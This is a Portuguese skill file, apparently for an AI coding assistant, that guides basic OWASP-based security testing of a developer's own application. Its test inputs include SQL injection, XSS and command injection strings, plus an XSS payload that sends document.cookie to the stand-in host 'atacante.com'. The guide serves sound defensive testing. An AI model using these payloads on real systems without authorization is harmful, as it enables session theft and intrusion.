---
name: teste-de-seguranca
description: >
  Guia o desenvolvedor na identificação e teste de vulnerabilidades de segurança no sistema,
  com foco em práticas acessíveis baseadas no OWASP Top 10. Use esta skill SEMPRE que o objetivo
  for verificar se o sistema está protegido contra as ameaças de segurança mais comuns. Acione
  quando o usuário mencionar: "teste de segurança", "security testing", "pentest básico",
  "vulnerabilidades", "OWASP", "SQL injection", "XSS", "cross-site scripting", "testar
  autenticação e autorização", "quero saber se minha API está segura", "auditoria de segurança
  básica", "dados dos usuários estão protegidos", "IDOR", "CORS", "injeção". Esta skill cobre
  o nível básico acessível a qualquer desenvolvedor — pentest profundo requer especialista em
  segurança ofensiva. Agnóstica de linguagem e framework.
categoria_ibm: Testes Não-Funcionais
nivel_maturidade: Intermediário / Avançado
skills_relacionadas:
  - teste-de-API
  - teste-de-sistema
---

# Teste de Segurança

## O que é

O teste de segurança verifica se o sistema está protegido contra acessos não autorizados, injeção de código malicioso e exposição de dados sensíveis. Esta skill cobre o nível básico — baseado no OWASP Top 10 — que qualquer desenvolvedor pode e deve aplicar. Para testes de penetração avançados (pentest completo), é recomendada a contratação de um especialista.

## Quando usar

- Antes de lançar qualquer sistema que processa dados de usuários
- Quando quer verificar se autenticação e autorização estão corretas
- Quando quer testar se campos de input são vulneráveis a injeção
- Quando quer verificar se dados sensíveis estão sendo protegidos corretamente
- Como parte da revisão de segurança antes de deploys em produção

## Quando NÃO usar

- Como substituto para um pentest profissional em sistemas de alta criticidade (financeiro, saúde)
- Em sistemas de produção sem autorização explícita dos responsáveis
- Sem entender as implicações legais de testes de segurança em sistemas de terceiros

## Como funciona — Processo Passo a Passo

**Passo 1: Definir escopo**
Quais partes do sistema serão avaliadas? (API, formulários web, autenticação, banco de dados). Qual nível de profundidade? Esta skill cobre: autenticação, autorização, validação de input e proteção de dados.

**Passo 2: Autenticação e autorização**
- Acessar recursos sem credenciais → deve retornar 401 (não 403, não 200)
- Credenciais inválidas → mensagem genérica (não revela se o usuário existe — "credenciais inválidas", nunca "senha errada para este e-mail")
- Acessar recurso de outro usuário → deve retornar 403 (IDOR — Insecure Direct Object Reference)
- Usuário comum acessar área de administração → deve retornar 403

**Passo 3: Validação de input (injeção)**
- SQL Injection: inserir `' OR '1'='1` em campos de texto que fazem queries
- XSS (Cross-Site Scripting): inserir `<script>alert('xss')</script>` em campos que renderizam HTML
- Command Injection: inserir `; ls -la` em campos processados pelo servidor
- Regra: NUNCA confiar em input do cliente — sempre validar e sanitizar no servidor

**Passo 4: Proteção de dados sensíveis**
- Dados trafegam via HTTPS? (não HTTP)
- Senhas armazenadas com hash robusto? (não texto plano, não MD5)
- Tokens e chaves de API aparecem em logs? Em respostas de API?
- Dados sensíveis (CPF, cartão) aparecem em URLs ou headers não criptografados?

**Passo 5: Headers e configurações**
- Headers de segurança presentes? (Content-Security-Policy, X-Frame-Options, X-Content-Type-Options)
- Versão do servidor ou framework exposta nos headers de resposta?
- CORS configurado corretamente? (não `Access-Control-Allow-Origin: *` em APIs privadas)

**Passo 6: Documentar vulnerabilidades**
Para cada vulnerabilidade: tipo, severidade (Crítica/Alta/Média/Baixa), como reproduzir, impacto e sugestão de correção.

## Critérios de Qualidade

- Autenticação, autorização E validação de input são cobertas
- Referência ao OWASP Top 10 como guia
- Vulnerabilidades classificadas por severidade
- Evidência de cada vulnerabilidade documentada (steps de reprodução)
- Limites honestos: menciona quando o escopo vai além desta skill (pentest avançado)

## Exemplo Conceitual

**Teste de IDOR (Insecure Direct Object Reference) em uma API de pedidos:**

Cenário: usuário A tem o pedido de ID 1001. Usuário B faz a requisição `GET /pedidos/1001` usando seu próprio token.

| Comportamento | Correto? |
|---------------|---------|
| Retorna os dados do pedido 1001 (do usuário A) | ❌ Vulnerabilidade crítica |
| Retorna 403 Forbidden | ✅ Correto |
| Retorna 404 Not Found | ✅ Aceitável (não revela que o recurso existe) |

**Teste de XSS em campo de nome de usuário:**

Input: `<script>document.location='http://atacante.com/cookie='+document.cookie</script>`

| Comportamento | Correto? |
|---------------|---------|
| Script é executado na página | ❌ Vulnerabilidade crítica |
| Input é sanitizado e exibido como texto | ✅ Correto |
| Campo rejeita o input com mensagem de erro | ✅ Correto |

## Checklist de Conclusão

- [ ] Testei acesso sem autenticação (deve retornar 401)?
- [ ] Testei acesso a recursos de outro usuário (deve retornar 403 — IDOR)?
- [ ] Testei SQL injection em campos de texto que fazem queries?
- [ ] Testei XSS em campos que renderizam HTML?
- [ ] Verifiquei que dados trafegam via HTTPS?
- [ ] Verifiquei que senhas não são armazenadas em texto plano?
- [ ] Documentei cada vulnerabilidade com severidade e steps de reprodução?

## Skills Relacionadas

| Skill | Relação | Quando preferir aquela |
|-------|---------|------------------------|
| `teste-de-API` | Complementar — testa o contrato HTTP | Quando quer validar autenticação e contratos antes de ir para segurança |
| `teste-de-sistema` | Escopo — sistema completo | Quando quer testar segurança no contexto do sistema completo, não apenas uma API |
